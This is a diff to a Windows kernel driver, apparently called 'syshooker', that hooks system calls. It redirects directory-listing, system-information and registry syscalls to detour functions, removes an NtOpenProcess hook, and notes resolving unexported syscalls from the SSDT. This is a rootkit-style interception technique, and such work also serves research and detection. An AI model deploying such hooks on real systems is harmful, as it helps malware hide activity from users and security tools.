@@ -34,7 +34,6 @@ SyshookerSettings Settings = {
 //#include "NtWriteFile.h" // not using this one
 #include "NtQueryDirectoryFile.h"
 #include "NtQueryDirectoryFileEx.h"
-#include "NtOpenProcess.h"
 #include "NtQuerySystemInformation.h"
 #include "NtOpenKey.h"
 #include "NtOpenKeyEx.h"
@@ -136,14 +135,7 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
 
-	// Find the original address of NtOpenProcess
-	OriginalNtOpenProcess = (NtOpenProcess_t)MmGetSystemRoutineAddress(&StringNtOpenProcess);
-	if (!OriginalNtOpenProcess)
-	{
-		kprintf("[-] syshooker: Failed to locate export: %wZ.\n", StringNtOpenProcess);
-		return STATUS_ENTRYPOINT_NOT_FOUND;
-	}
-
+	// Find the original address of NtQuerySystemInformation
 	OriginalNtQuerySystemInformation = (NtQuerySystemInformation_t)MmGetSystemRoutineAddress(&StringNtQuerySystemInformation);
 	if (!OriginalNtQuerySystemInformation)
 	{
@@ -151,7 +143,8 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
 
-
+	// ---------------------------- The easy part ends here ------------------------------------------
+	// 
 	// for the syscalls that are not exported, we cannot use MmGetSystemRoutineAddress
 	// we need to resolve their address from SSDT
 
@@ -243,6 +236,8 @@ void DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
 	// Release driver resources (symlink, device object)
 	IoDeleteSymbolicLink(&symLink);
 	IoDeleteDevice(DriverObject->DeviceObject);
+
+	kprintf("[+] syshooker: Unloaded.\n");
 }
 
 // this function will be called for each syscall invoked from user-space
@@ -280,12 +275,6 @@ void __fastcall SyscallCallback(
 	if (*SystemCallFunction == OriginalNtQueryDirectoryFileEx)
 	{
 		*SystemCallFunction = DetourNtQueryDirectoryFileEx;
-	}
-
-	// NtOpenProcess
-	if (*SystemCallFunction == OriginalNtOpenProcess)
-	{
-		*SystemCallFunction = DetourNtOpenProcess;
 	}
 
 	// NtQuerySystemInformation
